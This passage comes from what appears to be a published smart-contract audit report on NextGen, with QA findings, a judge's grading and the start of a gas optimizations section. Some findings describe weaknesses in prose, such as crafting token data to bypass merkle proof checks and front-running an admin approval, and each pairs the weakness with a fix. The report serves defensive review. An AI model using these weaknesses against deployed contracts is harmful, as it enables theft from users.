3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[14] It is not possible to add or remove generative scripts</h2>\n<p>Once the <code>NextGenCore::createCollection()</code> sets the generative scripts array, its size canâ€™t be changed: <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L138\">NextGenCore.sol#L138</a></p>\n<p>The <code>updateCollectionInfo()</code> allows to replace specific scripts, but it doesnâ€™t allow to remove them, or add a new one, which makes it more difficult to perform updates; as â€œdeletedâ€ scripts would have to be replaced with an empty value, on multiple transactions. Also newly scripts will have to be â€œsquashedâ€ into existing scripts elements.</p>\n<h3 id=\"recommendation-12\" style=\"position:relative;\"><a href=\"#recommendation-12\" aria-label=\"recommendation 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Allow the <code>updateCollectionInfo()</code> function to replace the whole scripts array.</p>\n<h2 id=\"15-merkle-nodes-can-have-64-bytes-length-making-internal-nodes-be-reinterpreted-as-leaf-values\" style=\"position:relative;\"><a href=\"#15-merkle-nodes-can-have-64-bytes-length-making-internal-nodes-be-reinterpreted-as-leaf-values\" aria-label=\"15 merkle nodes can have 64 bytes length making internal nodes be reinterpreted as leaf values permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[15] Merkle nodes can have 64 bytes length, making internal nodes be reinterpreted as leaf values</h2>\n<p>Some specific token data passed to the minting functions may be crafted to exploit this edge behavior of the merkle proof contract and bypass verification.</p>\n<p>The node is calculated here:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L212\">MinterContract.sol#L212</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L216\">MinterContract.sol#L216</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L348\">MinterContract.sol#L348</a></li>\n</ul>\n<p>An explanation can be found on the OpenZeppelin contract:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"58\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> * WARNING: </span><span class=\"mtk12\">You</span><span class=\"mtk1\"> </span><span class=\"mtk12\">should</span><span class=\"mtk1\"> </span><span class=\"mtk12\">avoid</span><span class=\"mtk1\"> </span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">leaf</span><span class=\"mtk1\"> </span><span class=\"mtk12\">values</span><span class=\"mtk1\"> </span><span class=\"mtk12\">that</span><span class=\"mtk1\"> </span><span class=\"mtk12\">are</span><span class=\"mtk1\"> </span><span class=\"mtk7\">64</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">long</span><span class=\"mtk1\"> </span><span class=\"mtk12\">prior</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hashing</span><span class=\"mtk1\">, </span><span class=\"mtk12\">or</span><span class=\"mtk1\"> </span><span class=\"mtk12\">use</span><span class=\"mtk1\"> </span><span class=\"mtk12\">a</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hash</span><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">other</span><span class=\"mtk1\"> </span><span class=\"mtk11\">than</span><span class=\"mtk1\"> </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\"> </span><span class=\"mtk11\">for</span><span class=\"mtk1\"> </span><span class=\"mtk11\">hashing</span><span class=\"mtk1\"> </span><span class=\"mtk11\">leaves</span><span class=\"mtk1\">.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk4\">*</span><span class=\"mtk1\"> </span><span class=\"mtk11\">This</span><span class=\"mtk1\"> </span><span class=\"mtk11\">is</span><span class=\"mtk1\"> </span><span class=\"mtk11\">because</span><span class=\"mtk1\"> </span><span class=\"mtk11\">the</span><span class=\"mtk1\"> </span><span class=\"mtk11\">concatenation</span><span class=\"mtk1\"> </span><span class=\"mtk11\">of</span><span class=\"mtk1\"> </span><span class=\"mtk11\">a</span><span class=\"mtk1\"> </span><span class=\"mtk11\">sorted</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pair</span><span class=\"mtk1\"> </span><span class=\"mtk11\">of</span><span class=\"mtk1\"> </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nodes</span><span class=\"mtk1\"> </span><span class=\"mtk11\">in</span><span class=\"mtk1\"> </span><span class=\"mtk11\">the</span><span class=\"mtk1\"> </span><span class=\"mtk11\">merkle</span><span class=\"mtk1\"> </span><span class=\"mtk11\">tree</span><span class=\"mtk1\"> </span><span class=\"mtk11\">could</span><span class=\"mtk1\"> </span><span class=\"mtk11\">be</span><span class=\"mtk1\"> </span><span class=\"mtk11\">reinterpreted</span><span class=\"mtk1\"> </span><span class=\"mtk11\">as</span><span class=\"mtk1\"> </span><span class=\"mtk11\">a</span><span class=\"mtk1\"> </span><span class=\"mtk11\">leaf</span><span class=\"mtk1\"> </span><span class=\"mtk11\">value</span><span class=\"mtk1\">.</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MerkleProof.sol#L13-L16\">MerkleProof.sol#L13-L16</a></p>\n<h3 id=\"recommendation-13\" style=\"position:relative;\"><a href=\"#recommendation-13\" aria-label=\"recommendation 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Add a prefix to the node hash, so that it makes sure the length is always <code>></code> 64 bytes.</p>\n<h2 id=\"16-merkle-proofs-from-burnorswapexternaltomint-could-be-used-in-mint-and-vice-versa\" style=\"position:relative;\"><a href=\"#16-merkle-proofs-from-burnorswapexternaltomint-could-be-used-in-mint-and-vice-versa\" aria-label=\"16 merkle proofs from burnorswapexternaltomint could be used in mint and vice versa permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[16] Merkle proofs from <code>burnOrSwapExternalToMint()</code> could be used in <code>mint()</code> and vice versa</h2>\n<p>The node in the <code>mint()</code> function is calculated as <code>node = keccak256(abi.encodePacked(_delegator, _maxAllowance, tokData));</code>. While in <code>burnOrSwapExternalToMint()</code> it is <code>node = keccak256(abi.encodePacked(_tokenId, tokData));</code></p>\n<p>Since the token data is variable, it can be crafted to make the node from one function match the other. Since both functions use the same merkle root, the proof would be valid.</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L212\">MinterContract.sol#L212</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L216\">MinterContract.sol#L216</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L348\">MinterContract.sol#L348</a></li>\n</ul>\n<h3 id=\"recommendation-14\" style=\"position:relative;\"><a href=\"#recommendation-14\" aria-label=\"recommendation 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Include some identifier if the same merkle root will be used for proofs with different data. Also hash the token data.</p>\n<h2 id=\"17-lack-of-check-for-empty-artist-signature\" style=\"position:relative;\"><a href=\"#17-lack-of-check-for-empty-artist-signature\" aria-label=\"17 lack of check for empty artist signature permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[17] Lack of check for empty artist signature</h2>\n<p>There is no check to prevent setting the artist signature as empty. Once the signature is set, it canâ€™t be changed and will leave the collection with an empty signature: <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/NextGenCore.sol#L259\">NextGenCore.sol#L259</a></p>\n<h3 id=\"recommendation-15\" style=\"position:relative;\"><a href=\"#recommendation-15\" aria-label=\"recommendation 15 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>Considering checking the artist signature:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"59\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    function artistSignature(uint256 _collectionID, string memory _signature) public {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+       require(bytes(_signature).length &gt; 0);</span></span></span></code></pre>\n<h2 id=\"18-artist-cant-propose-new-addresses-and-percentages\" style=\"position:relative;\"><a href=\"#18-artist-cant-propose-new-addresses-and-percentages\" aria-label=\"18 artist cant propose new addresses and percentages permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[18] Artist canâ€™t propose new addresses and percentages</h2>\n<p>Artists are required that the <code>status</code> of the <code>collectionArtistPrimaryAddresses</code> and <code>collectionArtistSecondaryAddresses</code> are set to <code>false</code>, in order to propose new addresses and percentages:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L381\">MinterContract.sol#L381</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L395\">MinterContract.sol#L395</a></li>\n</ul>\n<p>However, this also means that they canâ€™t propose new ones, once these values have been approved. The inconsistency can be seen clearly on how both functions try to update the <code>status</code> variable to <code>false</code>, despite the fact that it will always be <code>false</code> in that situation, as the previous <code>require</code> prevents it otherwise.</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L389\">MinterContract.sol#L389</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L403\">MinterContract.sol#L403</a></li>\n</ul>\n<p>This results in artists that canâ€™t propose new addresses and percentages once they were set.</p>\n<h3 id=\"recommendation-16\" style=\"position:relative;\"><a href=\"#recommendation-16\" aria-label=\"recommendation 16 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>One solution can be to create a new set of storage variables to save temporary proposed values by the artist, that the admins can then approve or not.</p>\n<h2 id=\"19-acceptaddressesandpercentages-can-be-frontrunned-by-artists-to-change-settings\" style=\"position:relative;\"><a href=\"#19-acceptaddressesandpercentages-can-be-frontrunned-by-artists-to-change-settings\" aria-label=\"19 acceptaddressesandpercentages can be frontrunned by artists to change settings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[19] <code>acceptAddressesAndPercentages()</code> can be frontrunned by artists to change settings</h2>\n<p><code>acceptAddressesAndPercentages()</code> has no way to prevent an artist frontrunning the transaction and changing expected addresses and percentages that the admins have reviewed, and are willing to approve.</p>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L408\">MinterContract.sol#L408</a></p>\n<p>This could be considered to break one of the <a href=\"https://github.com/code-423n4/2023-10-nextgen/tree/main#main-invariants\">main invariants of the protocol</a>, as the admin would approve addresses and percentages different than the ones they expected (without noticing):</p>\n<blockquote>\n<p>Properties that should NEVER be broken under any circumstance:</p>\n<ul>\n<li>Payments can only be made when royalties are set, the artist proposes addresses and percentages, and an admin approves them.</li>\n</ul>\n</blockquote>\n<h3 id=\"recommendation-17\" style=\"position:relative;\"><a href=\"#recommendation-17\" aria-label=\"recommendation 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommendation</h3>\n<p>One way to solve it is passing a hash that should match the on-chain parameters to be accepted.</p>\n<h2 id=\"20-acceptaddressesandpercentages-can-approve-addresses-and-percentages-that-have-not-been-set\" style=\"position:relative;\"><a href=\"#20-acceptaddressesandpercentages-can-approve-addresses-and-percentages-that-have-not-been-set\" aria-label=\"20 acceptaddressesandpercentages can approve addresses and percentages that have not been set permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[20] <code>acceptAddressesAndPercentages()</code> can approve addresses and percentages that have not been set</h2>\n<p>There is no check verifying that the addresses and percentages have been proposed by the artist. Nevertheless an admin can â€œacceptâ€ them. Consider checking that the proposed values are not empty.</p>\n<h2 id=\"21-unnecessary-address-payable-conversions\" style=\"position:relative;\"><a href=\"#21-unnecessary-address-payable-conversions\" aria-label=\"21 unnecessary address payable conversions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[21] Unnecessary address <code>payable</code> conversions</h2>\n<p>Addresses donâ€™t need to be converted to <code>payable</code> to send them value like <code>payable(addr).call{value: value}</code>. This adds unnecessary complexity to the code. Consider removing the <code>payable</code> conversions for the following instances:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/AuctionDemo.sol#L113\">AuctionDemo.sol#L113</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/AuctionDemo.sol#L116\">AuctionDemo.sol#L116</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/AuctionDemo.sol#L128\">AuctionDemo.sol#L128</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/AuctionDemo.sol#L139\">AuctionDemo.sol#L139</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/RandomizerRNG.sol#L82\">RandomizerRNG.sol#L82</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/MinterContract.sol#L434-L438\">MinterContract.sol#L434-L438</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/8b518196629faa37eae39736837b24926fd3c07c/smart-contracts/MinterContract.sol#L464\">MinterContract.sol#L464</a></li>\n</ul>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/747#issuecomment-1829205971\">a2rocket (NextGen) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/747#issuecomment-1847378054\">0xsomeone (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Wardenâ€™s QA report has been graded A based on a score of 66, combined with a manual review. The Wardenâ€™s submissionâ€™s score was assessed based on the following accepted findings:</p>\n<p><strong>Low-Risk</strong></p>\n<ul>\n<li>[02]</li>\n<li>[05]</li>\n<li>[15]</li>\n<li>[16]</li>\n<li>[17]</li>\n</ul>\n<p><strong>Non-Critical</strong></p>\n<ul>\n<li>[01]</li>\n<li>[08]</li>\n<li>[12]</li>\n<li>[13]</li>\n<li>[19]</li>\n</ul>\n<p><strong>Informational</strong></p>\n<ul>\n<li>[21]</li>\n</ul>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/747#issuecomment-1847437932\">0xsomeone (judge) commented</a>:</strong></p>\n<blockquote>\n<p>As this report has been selected as the best, I will provide additional feedback on the points that were not credited in the original assessment above:</p>\n<ul>\n<li>[03] Desirable Trait of the Protocol, Suitable Criticism for Analysis Submissions</li>\n<li>[04] Could be Argued as Deliberate <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/bot-report.md#g-19-functions-that-revert-when-called-by-norma0users-can-be-payable\">Optimization</a></li>\n<li>[06] Desirable Trait of the Protocol, Suitable Criticism for Analysis Submissions</li>\n<li>[07] Inconsequential &#x26; Gas Increase</li>\n<li>[09] Desirable Trait of the Protocol, Suitable Criticism for Analysis Submissions</li>\n<li>[10] Desirable Trait of the Protocol</li>\n<li>[11] Preference</li>\n<li>[14] Informational (Uncredited)</li>\n<li>[18] Desirable Trait of the Protocol</li>\n<li>[20] Desirable Trait of the Protocol</li>\n</ul>\n</blockquote>\n<p><em>Note: For full discussion, see <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/747\">here</a>.</em></p>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this audit, 19 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/191\">report highlighted below</a> by <strong>rahul</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1938\">r0ck3tz</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1876\">JCK</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1766\">K42</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1558\">c3phas</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1503\">thekmj</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1235\">SovaSlava</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1183\">lsaudit</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/765\">MrPotatoMagic</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/424\">0xAnah</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/2000\">petrichor</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1967\">DavidGiladi</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1955\">hunter_w3b</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1914\">0xSolus</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1739\">dharma09</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/447\">hihen</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/180\">leegh</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/127\">Tadev</a>, and <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/15\">epistkr</a>.</em></p>\n<h2 id=\"summary-1\" style=\"position:relative;\"><a href=\"#summary-1\" aria-label=\"summary 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 